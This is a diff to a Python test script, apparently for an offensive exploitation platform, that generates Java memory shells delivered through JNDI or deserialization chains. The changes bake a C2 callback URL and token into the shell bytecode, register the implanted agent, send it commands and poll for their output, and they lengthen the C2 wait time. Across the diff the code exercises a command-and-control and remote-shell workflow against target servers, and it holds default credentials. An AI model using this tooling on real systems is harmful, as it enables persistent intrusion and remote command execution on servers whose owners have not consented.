@@ -29,7 +29,7 @@ OOB_RMI     = int(os.getenv("OOB_RMI",    "1099"))
 USERNAME    = os.getenv("OOBX_USER",      "admin")
 PASSWORD    = os.getenv("OOBX_PASS",      "admin123")
 POLL_SEC    = int(os.getenv("POLL_SEC",   "12"))   # seconds to wait for callback
-C2_WAIT     = int(os.getenv("C2_WAIT",   "25"))    # seconds to wait for C2 agent
+C2_WAIT     = int(os.getenv("C2_WAIT",   "40"))    # seconds to wait for C2 agent
 
 # Callback URL the target can reach to prove OOB/RCE
 CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
@@ -135,6 +135,11 @@ def gen_memshell(framework, mtype, shell_type, deliver, token="", serialize_chai
                    "url_pattern": "/oobxtest", "password": "oobxtest"},
         "token": token, "deliver": deliver,
     }
+    # C2 type: embed c2_url and token in params so sidecar bakes them into bytecode
+    if shell_type == "c2":
+        body["params"]["c2_url"] = f"http://{OOB_HOST}:{OOB_HTTP}"
+        if token:
+            body["params"]["token"] = token
     if serialize_chain:
         body["serialize_chain"] = serialize_chain
     s, d = post("/memshells/generate", body)
@@ -647,18 +652,18 @@ def test_c2_memshell_jndi():
     if s4 != 200:
         record("c2_memshell_jndi", "FAIL", f"cmd send failed: {s4} {cmd_resp}")
         return
-    cmd_id = cmd_resp.get("cmd_id") or cmd_resp.get("id","")
+    cmd_id = cmd_resp.get("id") or cmd_resp.get("cmd_id","")
 
     # --- Step 5: wait for result ---
     print("  [*] Waiting for command result...")
-    deadline2 = time.time() + 20
+    deadline2 = time.time() + C2_WAIT
     output = None
     while time.time() < deadline2:
         s5, cmds = get(f"/c2/agents/{agent_id}/commands")
         if isinstance(cmds, list):
             for c in cmds:
-                if (c.get("cmd_id") == cmd_id or c.get("id") == cmd_id) and c.get("output"):
-                    output = c["output"]
+                if (c.get("id") == cmd_id or c.get("cmd_id") == cmd_id) and c.get("result"):
+                    output = c["result"]
                     break
         if output:
             break
@@ -672,7 +677,7 @@ def test_c2_memshell_jndi():
                f"C2 got output (may not be Linux): {output.strip()[:80]}")
     else:
         record("c2_memshell_jndi", "FAIL",
-               "agent registered but no command output received within 20s")
+               f"agent registered but no command output received within {C2_WAIT}s")
 
 
 def test_c2_memshell_serialize():
